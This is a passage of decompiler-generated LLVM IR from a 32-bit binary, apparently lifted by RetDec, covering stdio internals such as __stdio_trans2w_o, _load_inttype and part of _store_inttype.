  %v1_804fbf1 = add i32 %arg3, 4
  %v2_804fbf1 = inttoptr i32 %v1_804fbf1 to i32*
  %v3_804fbf1 = load i32, i32* %v2_804fbf1, align 4
  %v13_804fbf1 = icmp eq i32 %v3_804fbf1, -2
  %v1_804fbf5 = add i32 %arg3, 16
  %v2_804fbf5 = inttoptr i32 %v1_804fbf5 to i32*
  %v3_804fbf5 = load i32, i32* %v2_804fbf5, align 4
  %v1_804fbf8 = add i32 %arg3, 12
  %v2_804fbf8 = inttoptr i32 %v1_804fbf8 to i32*
  %v3_804fbf8 = load i32, i32* %v2_804fbf8, align 4
  %v1_804fbfb = icmp eq i1 %v13_804fbf1, false
  %v2_804fc1a = sub i32 %v3_804fbf8, %v3_804fbf5
  %v12_804fc1a = icmp eq i32 %v2_804fc1a, 0
  store i1 %v12_804fc1a, i1* %zf.global-to-local, align 1
  br i1 %v1_804fbfb, label %dec_label_pc_804fc1a, label %dec_label_pc_804fbfd

dec_label_pc_804fbfd:                             ; preds = %dec_label_pc_804fbf1
  store i32 %arg2, i32* @edi, align 4
  %v12_804fc01 = icmp eq i32 %v2_804fc1a, %arg2
  store i1 %v12_804fc01, i1* %zf.global-to-local, align 1
  %tmp33 = icmp ult i32 %v2_804fc1a, %arg2
  br i1 %tmp33, label %dec_label_pc_804fc05, label %dec_label_pc_804fc07

dec_label_pc_804fc05:                             ; preds = %dec_label_pc_804fbfd
  store i32 %v2_804fc1a, i32* @edi, align 4
  br label %dec_label_pc_804fc07

dec_label_pc_804fc07:                             ; preds = %dec_label_pc_804fbfd, %dec_label_pc_804fc05
  %v0_804fc07 = phi i32 [ %arg2, %dec_label_pc_804fbfd ], [ %v2_804fc1a, %dec_label_pc_804fc05 ]
  %v5_804fc09 = inttoptr i32 %v3_804fbf5 to i8*
  %v5_804fc0a = ptrtoint i8* %tmp26 to i32
  %v7_804fc0a = call i32 @memcpy(i8* %v5_804fc09, i32 %v0_804fc07, i32 %v5_804fc0a)
  %v0_804fc0f = load i32, i32* @ebx, align 4
  %v1_804fc0f = add i32 %v0_804fc0f, 16
  %v2_804fc0f = inttoptr i32 %v1_804fc0f to i32*
  %v3_804fc0f = load i32, i32* %v2_804fc0f, align 4
  %v4_804fc0f = load i32, i32* @edi, align 4
  %v5_804fc0f = add i32 %v4_804fc0f, %v3_804fc0f
  store i32 %v5_804fc0f, i32* %v2_804fc0f, align 4
  %v0_804fc12 = load i32, i32* @esp, align 4
  %v9_804fc12 = icmp eq i32 %v0_804fc12, -12
  store i1 %v9_804fc12, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_804fcb3

dec_label_pc_804fc1a:                             ; preds = %dec_label_pc_804fbf1
  %v7_804fc1c = inttoptr i32 %arg2 to i8*
  %v8_804fc1c = inttoptr i32 %v2_804fc1a to i8*
  %v14_804fc1c = icmp eq i32 %v2_804fc1a, %arg2
  store i1 %v14_804fc1c, i1* %zf.global-to-local, align 1
  %v8_804fc1e = icmp ugt i8* %v7_804fc1c, %v8_804fc1c
  br i1 %v8_804fc1e, label %dec_label_pc_804fc88, label %dec_label_pc_804fc20

dec_label_pc_804fc20:                             ; preds = %dec_label_pc_804fc1a
  %v5_804fc22 = inttoptr i32 %v3_804fbf5 to i8*
  %v5_804fc23 = ptrtoint i8* %tmp26 to i32
  %v7_804fc23 = call i32 @memcpy(i8* %v5_804fc22, i32 %arg2, i32 %v5_804fc23)
  %v0_804fc28 = load i32, i32* @ebx, align 4
  %v1_804fc28 = add i32 %v0_804fc28, 16
  %v2_804fc28 = inttoptr i32 %v1_804fc28 to i32*
  %v3_804fc28 = load i32, i32* %v2_804fc28, align 4
  %v4_804fc28 = load i32, i32* @esi, align 4
  %v5_804fc28 = add i32 %v4_804fc28, %v3_804fc28
  store i32 %v5_804fc28, i32* %v2_804fc28, align 4
  %v0_804fc2b = load i32, i32* @esp, align 4
  %v9_804fc2b = icmp eq i32 %v0_804fc2b, -12
  store i1 %v9_804fc2b, i1* %zf.global-to-local, align 1
  %v0_804fc2e = load i32, i32* @ebx, align 4
  %v1_804fc2e = add i32 %v0_804fc2e, 1
  %v2_804fc2e = inttoptr i32 %v1_804fc2e to i8*
  %v3_804fc2e = load i8, i8* %v2_804fc2e, align 1
  %v4_804fc2e = urem i8 %v3_804fc2e, 2
  %v5_804fc2e = icmp eq i8 %v4_804fc2e, 0
  store i1 %v5_804fc2e, i1* %zf.global-to-local, align 1
  br i1 %v5_804fc2e, label %dec_label_pc_804fcb3, label %dec_label_pc_804fc34

dec_label_pc_804fc34:                             ; preds = %dec_label_pc_804fc20
  %v0_804fc34 = load i32, i32* @esi, align 4
  %v5_804fc38 = call i32 @memrchr(i8 10, i32 %v0_804fc34)
  %v1_804fc40 = icmp eq i32 %v5_804fc38, 0
  store i1 %v1_804fc40, i1* %zf.global-to-local, align 1
  br i1 %v1_804fc40, label %dec_label_pc_804fcb3, label %dec_label_pc_804fc44

dec_label_pc_804fc44:                             ; preds = %dec_label_pc_804fc34
  %v0_804fc44 = load i32, i32* @ebx, align 4
  %v2_804fc45 = call i32 @__stdio_wcommit(i32 %v0_804fc44)
  %v1_804fc4d = icmp eq i32 %v2_804fc45, 0
  store i1 %v1_804fc4d, i1* %zf.global-to-local, align 1
  br i1 %v1_804fc4d, label %dec_label_pc_804fcb3, label %dec_label_pc_804fc51

dec_label_pc_804fc51:                             ; preds = %dec_label_pc_804fc44
  %v4_804fc51 = inttoptr i32 %v2_804fc45 to i8*
  store i8* %v4_804fc51, i8** %stack_var_-24, align 4
  %v1_804fc54 = load i32, i32* @esi, align 4
  %v12_804fc54 = icmp eq i32 %v2_804fc45, %v1_804fc54
  store i1 %v12_804fc54, i1* %zf.global-to-local, align 1
  %tmp34 = icmp ugt i32 %v2_804fc45, %v1_804fc54
  br i1 %tmp34, label %dec_label_pc_804fc58, label %dec_label_pc_804fc5b

dec_label_pc_804fc58:                             ; preds = %dec_label_pc_804fc51
  %v4_804fc58 = inttoptr i32 %v1_804fc54 to i8*
  store i8* %v4_804fc58, i8** %stack_var_-24, align 4
  br label %dec_label_pc_804fc5b

dec_label_pc_804fc5b:                             ; preds = %dec_label_pc_804fc51, %dec_label_pc_804fc58
  %v2_804fc64 = phi i8* [ %v4_804fc51, %dec_label_pc_804fc51 ], [ %v4_804fc58, %dec_label_pc_804fc58 ]
  %v4_804fc5d = ptrtoint i8* %v2_804fc64 to i32
  %v5_804fc5d = sub i32 %v1_804fc54, %v4_804fc5d
  %v0_804fc60 = load i32, i32* @ebp, align 4
  %v2_804fc60 = add i32 %v0_804fc60, %v5_804fc5d
  %v12_804fc60 = icmp eq i32 %v2_804fc60, 0
  store i1 %v12_804fc60, i1* %zf.global-to-local, align 1
  store i32 %v2_804fc60, i32* %ebp.global-to-local, align 4
  store i32 %v2_804fc60, i32* %edi.global-to-local, align 4
  %v1_804fc67 = icmp eq i8* %v2_804fc64, null
  br i1 %v1_804fc67, label %dec_label_pc_804fc74.thread, label %dec_label_pc_804fc69

dec_label_pc_804fc69:                             ; preds = %dec_label_pc_804fc5b
  %v1_804fc6b = inttoptr i32 %v2_804fc60 to i8*
  %v2_804fc6b = call i32 @_strlen(i8* %v1_804fc6b)
  %v0_804fc6d = load i32, i32* %edi.global-to-local, align 4
  %v1_804fc6d = add i32 %v0_804fc6d, -1
  store i32 %v1_804fc6d, i32* %edi.global-to-local, align 4
  %v0_804fc70 = load i1, i1* %zf.global-to-local, align 1
  br i1 %v0_804fc70, label %dec_label_pc_804fc74, label %dec_label_pc_804fc74.thread

dec_label_pc_804fc74.thread:                      ; preds = %dec_label_pc_804fc5b, %dec_label_pc_804fc69
  store i32 0, i32* %edi.global-to-local, align 4
  store i1 true, i1* %zf.global-to-local, align 1
  br label %dec_label_pc_804fcb3

dec_label_pc_804fc74:                             ; preds = %dec_label_pc_804fc69
  %v1_804fc74 = icmp eq i32 %v1_804fc6d, 0
  store i1 %v1_804fc74, i1* %zf.global-to-local, align 1
  br i1 %v1_804fc74, label %dec_label_pc_804fcb3, label %dec_label_pc_804fc78

dec_label_pc_804fc78:                             ; preds = %dec_label_pc_804fc74
  %v2_804fc78 = load i8*, i8** %stack_var_-24, align 4
  %v3_804fc78 = ptrtoint i8* %v2_804fc78 to i32
  %v0_804fc7b = load i32, i32* %ebp.global-to-local, align 4
  %v1_804fc6d.neg = sub i32 1, %v0_804fc6d
  %v2_804fc7b = add i32 %v3_804fc78, %v1_804fc6d.neg
  %v2_804fc7f = add i32 %v2_804fc7b, %v0_804fc7b
  %v0_804fc81 = load i32, i32* @esi, align 4
  %v2_804fc81 = sub i32 %v0_804fc81, %v2_804fc7f
  store i32 %v2_804fc81, i32* @esi, align 4
  %v0_804fc83 = load i32, i32* @ebx, align 4
  %v1_804fc83 = add i32 %v0_804fc83, 16
  %v2_804fc83 = inttoptr i32 %v1_804fc83 to i32*
  %v3_804fc83 = load i32, i32* %v2_804fc83, align 4
  %v5_804fc83 = sub i32 %v3_804fc83, %v2_804fc7f
  %v15_804fc83 = icmp eq i32 %v5_804fc83, 0
  store i1 %v15_804fc83, i1* %zf.global-to-local, align 1
  store i32 %v5_804fc83, i32* %v2_804fc83, align 4
  br label %dec_label_pc_804fcb3

dec_label_pc_804fc88:                             ; preds = %dec_label_pc_804fc1a
  %v2_804fc88 = add i32 %arg3, 8
  %v3_804fc88 = inttoptr i32 %v2_804fc88 to i32*
  %v4_804fc88 = load i32, i32* %v3_804fc88, align 4
  %v15_804fc88 = icmp eq i32 %v3_804fbf5, %v4_804fc88
  store i1 %v15_804fc88, i1* %zf.global-to-local, align 1
  br i1 %v15_804fc88, label %dec_label_pc_804fc9c, label %dec_label_pc_804fc8d

dec_label_pc_804fc8d:                             ; preds = %dec_label_pc_804fc88
  %v2_804fc8e = call i32 @__stdio_wcommit(i32 %arg3)
  store i32 %arg3, i32* %edi.global-to-local, align 4
  %v1_804fc94 = icmp eq i32 %v2_804fc8e, 0
  store i1 %v1_804fc94, i1* %zf.global-to-local, align 1
  br i1 %v1_804fc94, label %dec_label_pc_804fc8d.dec_label_pc_804fc9c_crit_edge, label %dec_label_pc_804fc98

dec_label_pc_804fc8d.dec_label_pc_804fc9c_crit_edge: ; preds = %dec_label_pc_804fc8d
  %v0_804fc9c.pre = load i32, i32* @esi, align 4
  %v0_804fca4.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804fc9c

dec_label_pc_804fc98:                             ; preds = %dec_label_pc_804fc8d
  store i1 true, i1* %zf.global-to-local, align 1
  store i32 0, i32* @esi, align 4
  br label %dec_label_pc_804fcb3

dec_label_pc_804fc9c:                             ; preds = %dec_label_pc_804fc8d.dec_label_pc_804fc9c_crit_edge, %dec_label_pc_804fc88, %entry
  %v0_804fca4 = phi i32 [ %v0_804fca4.pre, %dec_label_pc_804fc8d.dec_label_pc_804fc9c_crit_edge ], [ %arg3, %dec_label_pc_804fc88 ], [ %arg3, %entry ]
  %v0_804fc9c = phi i32 [ %v0_804fc9c.pre, %dec_label_pc_804fc8d.dec_label_pc_804fc9c_crit_edge ], [ %arg2, %dec_label_pc_804fc88 ], [ %arg2, %entry ]
  store i32 %v0_804fbd7, i32* @ebx, align 4
  store i32 %v0_804fbd6, i32* @esi, align 4
  %tmp31 = inttoptr i32 %v0_804fca4 to i16*
  %v7_804fcae = call i32 @__stdio_WRITE(i16* %tmp31, i32 %v0_804fc9c, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_804fcb3

dec_label_pc_804fcb3:                             ; preds = %dec_label_pc_804fc74.thread, %dec_label_pc_804fc74, %dec_label_pc_804fc44, %dec_label_pc_804fc34, %dec_label_pc_804fc20, %dec_label_pc_804fc98, %dec_label_pc_804fc78, %dec_label_pc_804fc07, %dec_label_pc_804fc9c
  %v0_804fcb3 = load i32, i32* @esi, align 4
  %v2_804fcb7 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804fcb7, i32* @ebx, align 4
  store i32 %v0_804fbd6, i32* @esi, align 4
  store i32 %v0_804fbd5, i32* @edi, align 4
  store i32 %v0_804fbd4, i32* @ebp, align 4
  ret i32 %v0_804fcb3

; uselistorder directives
  uselistorder i1 %v15_804fc88, { 1, 0 }
  uselistorder i32 %v2_804fc7f, { 1, 0 }
  uselistorder i32 %v1_804fc54, { 2, 3, 0, 1 }
  uselistorder i32 %v2_804fc45, { 0, 1, 3, 2 }
  uselistorder i32 %v2_804fc1a, { 0, 5, 3, 4, 1, 2, 6 }
  uselistorder i32 %v0_804fbd6, { 1, 0 }
  uselistorder i8** %stack_var_-24, { 3, 2, 1, 0 }
  uselistorder i1* %zf.global-to-local, { 0, 1, 2, 3, 4, 18, 5, 6, 7, 8, 9, 10, 11, 12, 14, 15, 13, 16, 17 }
  uselistorder i1 true, { 2, 1, 0, 3 }
  uselistorder i8 10, { 11, 0, 1, 2, 9, 10, 3, 4, 5, 6, 7, 8 }
  uselistorder i32 -12, { 0, 1, 8, 4, 5, 6, 7, 9, 10, 2, 11, 13, 12, 14, 15, 16, 17, 18, 19, 20, 21, 22, 3, 34, 35, 36, 26, 24, 23, 25, 27, 28, 29, 30, 31, 32, 33 }
  uselistorder i8 2, { 4, 14, 0, 1, 2, 3, 5, 6, 13, 19, 15, 7, 16, 8, 9, 10, 11, 17, 18, 12 }
  uselistorder i32 %arg3, { 1, 2, 0, 3, 4, 6, 5, 7, 8, 9 }
  uselistorder i32 %arg2, { 4, 5, 3, 0, 7, 6, 1, 2, 8, 9 }
  uselistorder label %dec_label_pc_804fcb3, { 8, 5, 6, 1, 0, 2, 3, 4, 7 }
  uselistorder label %dec_label_pc_804fc74.thread, { 1, 0 }
  uselistorder label %dec_label_pc_804fc5b, { 1, 0 }
  uselistorder label %dec_label_pc_804fc07, { 1, 0 }
}

define i32 @__stdio_trans2w_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %v0_804fcbc = load i32, i32* @ebx, align 4
  %v4_804fcbd = ptrtoint i16* %arg1 to i32
  store i32 %v4_804fcbd, i32* @ebx, align 4
  %v1_804fcc5 = bitcast i16* %arg1 to i32*
  %v2_804fcc5 = load i32, i32* %v1_804fcc5, align 4
  store i32 %v2_804fcc5, i32* %eax.global-to-local, align 4
  %v1_804fcc7 = urem i32 %v2_804fcc5, 65536
  store i32 %v1_804fcc7, i32* %edx.global-to-local, align 4
  %v2_804fcca = and i32 %v1_804fcc7, %arg2
  %v3_804fcca = icmp eq i32 %v2_804fcca, 0
  %v1_804fccc = icmp eq i1 %v3_804fcca, false
  br i1 %v1_804fccc, label %dec_label_pc_804fcdb, label %dec_label_pc_804fcce

dec_label_pc_804fcce:                             ; preds = %entry
  %v1_804fcce = and i32 %v2_804fcc5, 2176
  %v2_804fcce = icmp eq i32 %v1_804fcce, 0
  store i32 %v1_804fcce, i32* %edx.global-to-local, align 4
  %v1_804fcd4 = icmp eq i1 %v2_804fcce, false
  br i1 %v1_804fcd4, label %dec_label_pc_804fce3, label %dec_label_pc_804fcd6

dec_label_pc_804fcd6:                             ; preds = %dec_label_pc_804fcce
  %v2_804fcd6 = or i32 %v2_804fcc5, %arg2
  store i32 %v2_804fcd6, i32* %eax.global-to-local, align 4
  %v1_804fcd8 = trunc i32 %v2_804fcd6 to i16
  store i16 %v1_804fcd8, i16* %arg1, align 2
  %v0_804fcdb.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804fcdb

dec_label_pc_804fcdb:                             ; preds = %entry, %dec_label_pc_804fcd6
  %v0_804fd1f = phi i32 [ %v4_804fcbd, %entry ], [ %v0_804fcdb.pre, %dec_label_pc_804fcd6 ]
  %v1_804fcdb = inttoptr i32 %v0_804fd1f to i16*
  %v2_804fcdb = load i16, i16* %v1_804fcdb, align 2
  %v3_804fcdb = zext i16 %v2_804fcdb to i32
  store i32 %v3_804fcdb, i32* %edx.global-to-local, align 4
  %v2_804fcde = and i16 %v2_804fcdb, 32
  %v3_804fcde = icmp eq i16 %v2_804fcde, 0
  br i1 %v3_804fcde, label %dec_label_pc_804fcf7, label %dec_label_pc_804fce3

dec_label_pc_804fce3:                             ; preds = %dec_label_pc_804fcdb, %dec_label_pc_804fcce
  %v1_804fce3 = call i32 @__GI___errno_location(i32 %v0_804fcbc)
  store i32 %v1_804fce3, i32* %eax.global-to-local, align 4
  %v1_804fce8 = inttoptr i32 %v1_804fce3 to i32*
  store i32 9, i32* %v1_804fce8, align 4
  br label %dec_label_pc_804fcee

dec_label_pc_804fcee:                             ; preds = %dec_label_pc_804fd0e, %dec_label_pc_804fce3
  %v0_804fcee = load i32, i32* @ebx, align 4
  %v1_804fcee = inttoptr i32 %v0_804fcee to i16*
  %v2_804fcee = load i16, i16* %v1_804fcee, align 2
  %v3_804fcee = or i16 %v2_804fcee, 8
  store i16 %v3_804fcee, i16* %v1_804fcee, align 2
  store i32 -1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804fd51

dec_label_pc_804fcf7:                             ; preds = %dec_label_pc_804fcdb
  %v2_804fcf7 = urem i16 %v2_804fcdb, 4
  %v3_804fcf7 = icmp eq i16 %v2_804fcf7, 0
  br i1 %v3_804fcf7, label %dec_label_pc_804fd3c, label %dec_label_pc_804fcfc

dec_label_pc_804fcfc:                             ; preds = %dec_label_pc_804fcf7
  %v2_804fcfc = and i32 %v3_804fcdb, 4
  %v3_804fcfc = icmp eq i32 %v2_804fcfc, 0
  %v1_804fcff = icmp eq i1 %v3_804fcfc, false
  br i1 %v1_804fcff, label %dec_label_pc_804fd2c, label %dec_label_pc_804fd01

dec_label_pc_804fd01:                             ; preds = %dec_label_pc_804fcfc
  %v1_804fd01 = add i32 %v0_804fd1f, 20
  %v2_804fd01 = inttoptr i32 %v1_804fd01 to i32*
  %v3_804fd01 = load i32, i32* %v2_804fd01, align 4
  store i32 %v3_804fd01, i32* %eax.global-to-local, align 4
  %v2_804fd04 = add i32 %v0_804fd1f, 16
  %v3_804fd04 = inttoptr i32 %v2_804fd04 to i32*
  %v4_804fd04 = load i32, i32* %v3_804fd04, align 4
  %v15_804fd04 = icmp eq i32 %v3_804fd01, %v4_804fd04
  %v1_804fd07 = icmp eq i1 %v15_804fd04, false
  br i1 %v1_804fd07, label %dec_label_pc_804fd0e, label %dec_label_pc_804fd09

dec_label_pc_804fd09:                             ; preds = %dec_label_pc_804fd01
  %v2_804fd09 = and i32 %v3_804fcdb, 2
  %v3_804fd09 = icmp eq i32 %v2_804fd09, 0
  br i1 %v3_804fd09, label %dec_label_pc_804fd2c, label %dec_label_pc_804fd0e

dec_label_pc_804fd0e:                             ; preds = %dec_label_pc_804fd09, %dec_label_pc_804fd01
  %v1_804fd0e = and i32 %v3_804fcdb, 1024
  store i32 %v1_804fd0e, i32* %edx.global-to-local, align 4
  %tmp13 = udiv i32 %v1_804fd0e, 1024
  %tmp14 = xor i32 %tmp13, 3
  store i32 %tmp14, i32* %eax.global-to-local, align 4
  %v4_804fd20 = call i32 @__GI_fseek(i32 %v0_804fd1f, i32 0, i32 %tmp14)
  store i32 %v4_804fd20, i32* %eax.global-to-local, align 4
  %v1_804fd28 = icmp eq i32 %v4_804fd20, 0
  %v1_804fd2a = icmp eq i1 %v1_804fd28, false
  br i1 %v1_804fd2a, label %dec_label_pc_804fcee, label %dec_label_pc_804fd0e.dec_label_pc_804fd2c_crit_edge

dec_label_pc_804fd0e.dec_label_pc_804fd2c_crit_edge: ; preds = %dec_label_pc_804fd0e
  %v0_804fd2c.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804fd2c

dec_label_pc_804fd2c:                             ; preds = %dec_label_pc_804fd0e.dec_label_pc_804fd2c_crit_edge, %dec_label_pc_804fd09, %dec_label_pc_804fcfc
  %v10_804fd2c = phi i32 [ %v0_804fd2c.pre, %dec_label_pc_804fd0e.dec_label_pc_804fd2c_crit_edge ], [ %v0_804fd1f, %dec_label_pc_804fd09 ], [ %v0_804fd1f, %dec_label_pc_804fcfc ]
  %v1_804fd2c = inttoptr i32 %v10_804fd2c to i16*
  %v2_804fd2c = load i16, i16* %v1_804fd2c, align 2
  %v3_804fd2c = and i16 %v2_804fd2c, -4
  store i16 %v3_804fd2c, i16* %v1_804fd2c, align 2
  %v0_804fd30 = load i32, i32* @ebx, align 4
  %v1_804fd30 = add i32 %v0_804fd30, 8
  %v2_804fd30 = inttoptr i32 %v1_804fd30 to i32*
  %v3_804fd30 = load i32, i32* %v2_804fd30, align 4
  store i32 %v3_804fd30, i32* %eax.global-to-local, align 4
  %v2_804fd33 = add i32 %v0_804fd30, 24
  %v3_804fd33 = inttoptr i32 %v2_804fd33 to i32*
  store i32 %v3_804fd30, i32* %v3_804fd33, align 4
  %v0_804fd36 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fd36 = load i32, i32* @ebx, align 4
  %v2_804fd36 = add i32 %v1_804fd36, 16
  %v3_804fd36 = inttoptr i32 %v2_804fd36 to i32*
  store i32 %v0_804fd36, i32* %v3_804fd36, align 4
  %v0_804fd39 = load i32, i32* %eax.global-to-local, align 4
  %v1_804fd39 = load i32, i32* @ebx, align 4
  %v2_804fd39 = add i32 %v1_804fd39, 20
  %v3_804fd39 = inttoptr i32 %v2_804fd39 to i32*
  store i32 %v0_804fd39, i32* %v3_804fd39, align 4
  %v0_804fd3c.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804fd3c

dec_label_pc_804fd3c:                             ; preds = %dec_label_pc_804fcf7, %dec_label_pc_804fd2c
  %v2_804fd41 = phi i32 [ %v0_804fd1f, %dec_label_pc_804fcf7 ], [ %v0_804fd3c.pre, %dec_label_pc_804fd2c ]
  %v1_804fd3c = inttoptr i32 %v2_804fd41 to i32*
  %v2_804fd3c = load i32, i32* %v1_804fd3c, align 4
  %v1_804fd3e = or i32 %v2_804fd3c, 64
  store i32 %v1_804fd3e, i32* %eax.global-to-local, align 4
  %v1_804fd41 = trunc i32 %v1_804fd3e to i16
  %v3_804fd41 = inttoptr i32 %v2_804fd41 to i16*
  store i16 %v1_804fd41, i16* %v3_804fd41, align 2
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_804fd46 = load i32, i32* %eax.global-to-local, align 4
  %v3_804fd46 = and i32 %v0_804fd46, 2816
  %v4_804fd46 = icmp eq i32 %v3_804fd46, 0
  %v1_804fd49 = icmp eq i1 %v4_804fd46, false
  br i1 %v1_804fd49, label %dec_label_pc_804fd51, label %dec_label_pc_804fd4b

dec_label_pc_804fd4b:                             ; preds = %dec_label_pc_804fd3c
  %v0_804fd4b = load i32, i32* @ebx, align 4
  %v1_804fd4b = add i32 %v0_804fd4b, 12
  %v2_804fd4b = inttoptr i32 %v1_804fd4b to i32*
  %v3_804fd4b = load i32, i32* %v2_804fd4b, align 4
  store i32 %v3_804fd4b, i32* %eax.global-to-local, align 4
  %v2_804fd4e = add i32 %v0_804fd4b, 28
  %v3_804fd4e = inttoptr i32 %v2_804fd4e to i32*
  store i32 %v3_804fd4b, i32* %v3_804fd4e, align 4
  %v0_804fd51.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804fd51

dec_label_pc_804fd51:                             ; preds = %dec_label_pc_804fd3c, %dec_label_pc_804fcee, %dec_label_pc_804fd4b
  %v0_804fd51 = phi i32 [ 0, %dec_label_pc_804fd3c ], [ -1, %dec_label_pc_804fcee ], [ %v0_804fd51.pre, %dec_label_pc_804fd4b ]
  store i32 %v0_804fd51, i32* %eax.global-to-local, align 4
  ret i32 %v0_804fd51

; uselistorder directives
  uselistorder i32 %v0_804fd51, { 1, 0 }
  uselistorder i32 %v0_804fd1f, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v1_804fcc7, { 1, 0 }
  uselistorder i32 %v2_804fcc5, { 1, 2, 0, 3 }
  uselistorder i32 1024, { 0, 7, 6, 5, 8, 3, 1, 2, 4 }
  uselistorder i16 8, { 4, 5, 6, 7, 8, 3, 2, 0, 1 }
  uselistorder i16 0, { 7, 8, 0, 9, 1, 10, 6, 2, 3, 4, 5 }
  uselistorder i16 32, { 3, 0, 1, 2 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804fd51, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804fd3c, { 1, 0 }
  uselistorder label %dec_label_pc_804fcdb, { 1, 0 }
}

define i32 @_load_inttype() local_unnamed_addr {
entry:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %v5_804fd60 = icmp slt i32 %tmp, 0
  %v3_804fd89 = and i32 %tmp4, 2048
  %v4_804fd89 = icmp eq i32 %v3_804fd89, 0
  br i1 %v5_804fd60, label %dec_label_pc_804fd89, label %dec_label_pc_804fd67

dec_label_pc_804fd67:                             ; preds = %entry
  %v1_804fd6a = icmp eq i1 %v4_804fd89, false
  br i1 %v1_804fd6a, label %dec_label_pc_804fd8e, label %dec_label_pc_804fd6c

dec_label_pc_804fd6c:                             ; preds = %dec_label_pc_804fd67
  %v1_804fd6c = inttoptr i32 %tmp3 to i32*
  %v2_804fd6c = load i32, i32* %v1_804fd6c, align 4
  %v6_804fd6e = icmp eq i32 %tmp4, 256
  %v1_804fd74 = icmp eq i1 %v6_804fd6e, false
  br i1 %v1_804fd74, label %dec_label_pc_804fd7b, label %dec_label_pc_804fd76

dec_label_pc_804fd76:                             ; preds = %dec_label_pc_804fd6c
  %v1_804fd76 = urem i32 %v2_804fd6c, 256
  br label %dec_label_pc_804fd86

dec_label_pc_804fd7b:                             ; preds = %dec_label_pc_804fd6c
  %v6_804fd7b = icmp eq i32 %tmp4, 512
  %v1_804fd81 = icmp eq i1 %v6_804fd7b, false
  br i1 %v1_804fd81, label %dec_label_pc_804fd86, label %dec_label_pc_804fd83

dec_label_pc_804fd83:                             ; preds = %dec_label_pc_804fd7b
  %v1_804fd83 = urem i32 %v2_804fd6c, 65536
  br label %dec_label_pc_804fd86

dec_label_pc_804fd86:                             ; preds = %dec_label_pc_804fd7b, %dec_label_pc_804fd76, %dec_label_pc_804fd83
  %v0_804fd88 = phi i32 [ %v2_804fd6c, %dec_label_pc_804fd7b ], [ %v1_804fd76, %dec_label_pc_804fd76 ], [ %v1_804fd83, %dec_label_pc_804fd83 ]
  store i32 0, i32* @edx, align 4
  ret i32 %v0_804fd88

dec_label_pc_804fd89:                             ; preds = %entry
  br i1 %v4_804fd89, label %dec_label_pc_804fd94, label %dec_label_pc_804fd8e

dec_label_pc_804fd8e:                             ; preds = %dec_label_pc_804fd89, %dec_label_pc_804fd67
  %v1_804fd8e = add i32 %tmp3, 4
  %v2_804fd8e = inttoptr i32 %v1_804fd8e to i32*
  %v3_804fd8e = load i32, i32* %v2_804fd8e, align 4
  store i32 %v3_804fd8e, i32* @edx, align 4
  %v1_804fd91 = inttoptr i32 %tmp3 to i32*
  %v2_804fd91 = load i32, i32* %v1_804fd91, align 4
  ret i32 %v2_804fd91

dec_label_pc_804fd94:                             ; preds = %dec_label_pc_804fd89
  %v1_804fd94 = inttoptr i32 %tmp3 to i32*
  %v2_804fd94 = load i32, i32* %v1_804fd94, align 4
  %v6_804fd96 = icmp eq i32 %tmp4, 256
  %v1_804fd9c = icmp eq i1 %v6_804fd96, false
  br i1 %v1_804fd9c, label %dec_label_pc_804fda3, label %dec_label_pc_804fd9e

dec_label_pc_804fd9e:                             ; preds = %dec_label_pc_804fd94
  %v1_804fd9e = urem i32 %v2_804fd94, 256
  br label %dec_label_pc_804fdac

dec_label_pc_804fda3:                             ; preds = %dec_label_pc_804fd94
  %v6_804fda3 = icmp eq i32 %tmp4, 512
  %v1_804fda9 = icmp eq i1 %v6_804fda3, false
  br i1 %v1_804fda9, label %dec_label_pc_804fdac, label %dec_label_pc_804fdab

dec_label_pc_804fdab:                             ; preds = %dec_label_pc_804fda3
  %v1_804fdab = mul i32 %v2_804fd94, 65536
  %v2_804fdab = sdiv i32 %v1_804fdab, 65536
  br label %dec_label_pc_804fdac

dec_label_pc_804fdac:                             ; preds = %dec_label_pc_804fda3, %dec_label_pc_804fd9e, %dec_label_pc_804fdab
  %v0_804fdac = phi i32 [ %v2_804fd94, %dec_label_pc_804fda3 ], [ %v1_804fd9e, %dec_label_pc_804fd9e ], [ %v2_804fdab, %dec_label_pc_804fdab ]
  %v1_804fdac = ashr i32 %v0_804fdac, 31
  store i32 %v1_804fdac, i32* @edx, align 4
  ret i32 %v0_804fdac

; uselistorder directives
  uselistorder i32 %v0_804fdac, { 1, 0 }
  uselistorder i32 %v2_804fd94, { 2, 0, 1 }
  uselistorder i32 %v2_804fd6c, { 2, 0, 1 }
  uselistorder i32 %tmp3, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_804fdac, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804fd86, { 2, 0, 1 }
}

define i32 @_store_inttype() local_unnamed_addr {
entry:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %tmp6 = call i16* @__decompiler_undefined_function_2()
  %stack_var_-4 = alloca i32, align 4
  %v0_804fdb0 = load i32, i32* @ebx, align 4
  store i32 %v0_804fdb0, i32* %stack_var_-4, align 4
  %v4_804fdb1 = ptrtoint i16* %tmp6 to i32
  store i32 %v4_804fdb1, i32* %ebx.global-to-local, align 4
  %v4_804fdb9 = trunc i32 %tmp4 to i16
  %v6_804fdc1 = icmp eq i32 %tmp5, 256
